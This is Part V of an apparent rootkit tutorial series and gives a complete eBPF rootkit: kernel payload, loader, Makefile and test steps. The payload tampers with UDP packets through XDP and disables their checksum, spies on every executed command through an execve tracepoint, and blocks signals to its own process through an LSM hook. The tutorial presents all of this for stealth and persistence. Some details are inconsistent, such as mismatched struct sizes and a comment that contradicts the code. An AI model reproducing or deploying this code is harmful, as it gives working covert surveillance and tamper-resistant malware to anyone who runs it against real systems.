      ____  ____  _____
  ___| __ )|  _ \|  ___|
 / _ \  _ \| |_) | |_ 
|  __/ |_) |  __/|  _|
 \___|____/|_|   |_| 

================================================================================
                              PART V: eBPF
================================================================================


----[ Introduction - The Shift from LKM to eBPF ]-----------------------------

In Part I, III, and IV, we built Loadable Kernel Modules (LKMs).
-   We compiled a .ko file.
-   We used insmod to load it.
-   We were running in Ring 0...

eBPF IS DIFFERENT. https://docs.ebpf.io/ [ RTFM ]

eBPF programs are NOT Kernel Modules. They are not .ko files.
They are bytecode programs that run inside a Virtual Machine in the kernel.

Because they are not modules, insmod cannot load them.
So we have to write our own Loader to inject them.
But an eBPF rootkit sees the truth. If a system admin has a cron job running in 
the background, we see it. If an attacker tries to run a hidden script, we see it.
If EDR does ANYTHING, we see it. 

It's hard to hide from the Kernel man.

ADVANTAGES OF eBPF:
    1.  Stealth: eBPF programs do NOT show up in lsmod.
    2.  Safety: The Verifier help you not crash the kernel.
    3.  Persistence: You can pin them to the filesystem; 
        abandon your loader.

----[ The Architecture: Visual Flow ]-----------------------------------------

Comparison of how our rootkits get into the kernel:

        TRADITIONAL LKM                      MODERN eBPF ROOTKIT
      (Ftrace / Kprobes)                    (XDP / Tracepoints)
      ------------------                    -------------------

    [ malware.c ]                         [ exploit.bpf.c ]  [ loader.c ]
          |                                      |                |
          v                                      v                v
    [ malware.ko ]                        [ exploit.o ]      [ loader ]
          |                               (Bytecode)         (Binary)
          |                                      |                |
          v                                      |                |
    [ insmod malware.ko ]                        +-------+--------+
          |                                              |
          | (System Call: finit_module)                  | (System Call: bpf)
          v                                              v
    [ KERNEL SPACE ]                              [ KERNEL SPACE ]
    | Runs Native Code |                          | Runs Verifier |
    | Can Crash OS     |                          | JIT Compiles  |
    +------------------+                          | Runs Safely   |
                                                  +---------------+

----[ Development Environment ]-----------------------------------------------

We need Clang (to compile bytecode) and libbpf (to handle the injection).

INSTALLATION:
    sudo apt install bpftool clang llvm libbpf-dev linux-tools-$(uname -r)

WORKSPACE LAYOUT:
    /your_directory
      |-- exploit.bpf.c     (The Kernel Logic - "Your Trojans")
      |-- loader.c          (The Injector - "Your horse...?")
      |-- vmlinux.h         (Kernel type definitions - Generated)
      |-- Makefile          (Builds both parts)


----[ The Kernel Payload (exploit.bpf.c) ]------------------------------------

This code runs inside the kernel. 

#include "vmlinux.h"

// --- [ KALI PATCH: Type Compatibility ] ---
typedef unsigned long long __u64;
typedef unsigned int       __u32;
typedef unsigned short     __u16;
typedef unsigned char      __u8;
typedef int                __s32;
typedef long long          __s64;

typedef __u32 __wsum;
typedef __u32 __be32;
typedef __u16 __be16;
typedef __u64 __be64;

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define ETH_P_IP    0x0800
#define IPPROTO_UDP 17

// Helper to swap endianness (Host <-> Network)
#define bpf_htons(x) __builtin_bswap16(x)

// ---[ MAPS ]---
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);
} pid_map SEC(".maps");


SEC("xdp")
int xdp_troll(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data     = (void *)(long)ctx->data;

    // 1. Parse Ethernet Header
    struct ethhdr *eth = data;
    if ((void*)(eth + 1) > data_end) return XDP_PASS;

    // 2. Parse IP Header (Check if it's IP)
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void*)(eth + 1);
    if ((void*)(ip + 1) > data_end) return XDP_PASS;

    // 3. Parse UDP Header (Check if it's UDP)
    if (ip->protocol != IPPROTO_UDP) return XDP_PASS;

    struct udphdr *udp = (void*)(ip + 1);
    if ((void*)(udp + 1) > data_end) return XDP_PASS;

    // 4. Target Port 4444
    if (udp->dest != bpf_htons(4444)) return XDP_PASS;

    // 5. Point to the Payload (The text data)
    char *payload = (void*)(udp + 1);

    // Ensure we have at least 5 bytes of data to overwrite
    if ((void*)(payload + 5) > data_end) return XDP_PASS;

    // ---[ THE HACK ]---
    // Overwrite the first 5 bytes of the message
    payload[0] = 'P';
    payload[1] = 'W';
    payload[2] = 'N';
    payload[3] = 'E';
    payload[4] = 'D';

    // DISABLE CHECKSUM VALIDATION
    // If we change data, the original checksum is wrong, and the kernel would drop it.
    // In UDP, setting checksum to 0 tells the kernel "Don't bother checking."
    udp->check = 0;

    bpf_printk("ROOTKIT: Trolling packet on port 4444\n");

    return XDP_PASS;
}


// ---[ PAYLOAD 2: Tracepoint Spy ]---
struct event_t {
    u32 pid;
    char comm[80]; // Set larger size to hold more filenames/commands
};

SEC("tp/syscalls/sys_enter_execve")
int tp_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct event_t *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (!e) return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;

    /* FIX: For tracepoints (sys_enter), arguments are stored in the
     *      'args' array. args[0] is the first argument (the filename).
     */
    bpf_probe_read_user_str(e->comm, sizeof(e->comm), (void *)ctx->args[0]);

    bpf_ringbuf_submit(e, 0);
    return 0;
}


// ---[ PAYLOAD 3: Another Kill Blocker (Active Defense this time though!) ]---
// If override_return is disabled, we switch to bpf_send_signal.
// Instead of blocking the syscall, we KILL the process trying to kill us.

SEC("lsm/task_kill")
int BPF_PROG(restrict_kill, struct task_struct *p, struct kernel_siginfo *info, int sig, const struct cred *cred)
{
    pid_t target_pid = p->tgid;
    u32 key = 0;
    u32 *protected_pid;

    // Check if the process being killed (p) is our protected PID
    protected_pid = bpf_map_lookup_elem(&pid_map, &key);

    if (protected_pid && target_pid == *protected_pid) {
        bpf_printk("ROOTKIT: LSM Blocked signal %d to PID %d\n", sig, target_pid);

        // Return -EPERM (Operation not permitted)
        // This stops the signal from ever being sent!
        return -1;
    }

    return 0; // Allow everything else
}
char LICENSE[] SEC("license") = "GPL";

----[ Our Loader (loader.c) ]---------------------------------------

#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <net/if.h>
#include <bpf/libbpf.h>
#include "exploit.skel.h"

// TARGET INTERFACE: Change this if yours is 'ens33' or 'wlan0'
#define IFACE "lo"

static volatile bool exiting = false;
static void sig_handler(int sig) { exiting = true; }

// Callback for Ring Buffer events
struct event_t { unsigned int pid; char comm[16]; };
static int handle_event(void *ctx, void *data, size_t data_sz) {
    const struct event_t *e = data;
    printf("[SPY] PID: %d ran Command: %s\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct exploit_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;
    int my_pid = getpid();
    int ifindex;

    // 0. Find Network Interface
    ifindex = if_nametoindex(IFACE);
    if (ifindex == 0) {
        fprintf(stderr, "Error: Interface %s not found.\n", IFACE);
        return 1;
    }

    // 1. Load BPF Skeleton
    skel = exploit_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }

    // 2. Load into Kernel
    err = exploit_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load eBPF: %d\n", err);
        return 1;
    }

    // 3. Configure Maps (Protect OUR pid)
    int key = 0;

    // FIX: Modern libbpf requires explicit sizes for key and value
    // Signature: (map_ptr, key_ptr, key_size, val_ptr, val_size, flags)
    err = bpf_map__update_elem(skel->maps.pid_map,
                               &key, sizeof(key),
                               &my_pid, sizeof(my_pid),
                               0);

    if (err) {
        fprintf(stderr, "Failed to update PID map: %d\n", err);
        return 1;
    }
    printf("[+] Rootkit active. Protecting PID: %d\n", my_pid);

    // 4. Attach Tracepoints & Kprobes
    err = exploit_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF: %d\n", err);
        return 1;
    }

    // 5. Attach XDP (Network Hook)
    skel->links.xdp_troll = bpf_program__attach_xdp(skel->progs.xdp_troll, ifindex);
    if (!skel->links.xdp_troll) {
        fprintf(stderr, "[!] XDP Attach failed (Try sudo?)\n");
        // We continue anyway to test the other features
    } else {
        printf("[+] XDP Magic Packet backdoor attached to %s\n", IFACE);
    }

    // 6. Read Logs from Kernel
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        return 1;
    }

    // Setup signal handler for clean exit
    signal(SIGINT, sig_handler);

    printf("[+] Logging active. Ctrl+C to unload.\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout ms */);
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            fprintf(stderr, "Error polling ring buffer: %d\n", err);
            break;
        }
    }

    // Cleanup
    ring_buffer__free(rb);
    exploit_bpf__destroy(skel);
    return 0;
}

----[ The Makefile ]----------------------------------------------------------

TARGET = rootkit_loader
ARCH = $(shell uname -m | sed 's/x86_64/x86/' | sed 's/aarch64/arm64/')
BPF_OBJ = exploit.bpf.o

all: $(TARGET)

# 1. Generate Kernel Type Definitions
vmlinux.h:
	bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h

# 2. Compile Kernel Payload (Bytecode)
$(BPF_OBJ): exploit.bpf.c vmlinux.h
	clang -g -O2 -target bpf -D__TARGET_ARCH_$(ARCH) -c exploit.bpf.c -o $@

# 3. Generate Loader Skeleton
exploit.skel.h: $(BPF_OBJ)
	bpftool gen skeleton $(BPF_OBJ) > exploit.skel.h

# 4. Compile Userland Loader
$(TARGET): loader.c exploit.skel.h
	gcc -g -O2 -Wall loader.c -o $@ -lbpf -lelf -lz

clean:
	rm -f $(TARGET) *.o *.skel.h vmlinux.h


----[ Testing Walkthrough ]---------------------------------------------------

1.  CHECK INTERFACE:
    $ ip a
    (Identify your interface. If it is NOT 'eth0', edit loader.c)

2.  COMPILE:
    $ make

3.  LOAD (Run the Loader):
    $ sudo ./rootkit_loader
    [+] Rootkit active. Protecting PID: 1337
    [+] XDP Magic Packet backdoor attached to lo
    [+] Logging active. Ctrl+C to unload.

    (Leave this terminal open!)

4.  TEST EXECVE SPY (Open a Second Terminal):
    $ ls
    $ whoami
    
    (Look at the first terminal. You should see logs:)
    [SPY] PID: 1234 ran Command: /usr/bin/ls
    [SPY] PID: 1234 ran Command: /usr/bin/whoami

5.  TEST KILL BLOCKER (Second Terminal):
    Try to kill the loader process (use the PID printed in step 3).
    $ sudo kill -9 1337
    kill: (1337): Operation not permitted

6.  TEST "THE TROLL" (Active MitM): 
        We will intercept a chat message on 127.0.0.1 and rewrite it in flight.
    
    Terminal 2:
    $ nc -u -l -p 4444
    
    Terminal 3:
    $ nc -u 127.0.0.1 4444
    Type Hello World and Hit Enter

    Terminal 2 gets PWNED World

  ____  _   _ __  __ __  __    _    ____  __   __
 / ___|| | | |  \/  |  \/  |  / \  |  _ \ \ \ / /
 \___ \| | | | |\/| | |\/| | / _ \ | |_) | \ V / 
  ___) | |_| | |  | | |  | |/ ___ \|  _ <   | |  
 |____/ \___/|_|  |_|_|  |_/_/   \_\_| \_\  |_|  


----[ Summary: eBPF Capabilities ]--------------------------------------------

WHAT YOU LEARNED:

    - Architectural Shift: Moving from Kernel Modules (.ko) to verified Bytecode.
    - Packet Malleability: XDP allows not just reading packets, but modifying them before the OS sees them.
    - Checksum Bypassing: Forcing the kernel to accept corrupted packets (UDP Checksum = 0).
    - LSM Hooks: Using "Return Code Override" to silently neutralize system.
    - Tracepoints: accessing syscall arguments safely via the args array.

TECHNIQUE COMPARISON:

Legacy Rootkits (LKM):

    [+] Full unrestricted memory access.
    [-] Higher risk of kernel panic (BSOD).
    [-] Dependent on specific kernel headers/versions.

Modern eBPF Rootkits:

    [+] Stealth: Does not appear in lsmod.
    [+] Portability: CO-RE (Compile Once, Run Everywhere) binary compatibility across kernel versions.
    [-] Restrictions: Cannot write to arbitrary kernel memory (mostly).

You have now mastered the three pillars of modern Linux Rootkits:

    Userland (LD_PRELOAD)
    Kernel Hooking (Ftrace/Kprobes)
    Programmable Kernel (eBPF)

The last .md awaits: persistence strategies.

            ▐             
            ▜▀ ▞▀▖▛▀▖▞▀▌▌ ▌
            ▐ ▖▛▀ ▌ ▌▚▄▌▌ ▌
             ▀ ▝▀▘▘ ▘▗▄▘▝▀▘
                  
                   ONWARDS TO
                 PART VI: PERSISTENCE &
                    EVASION

.EOF
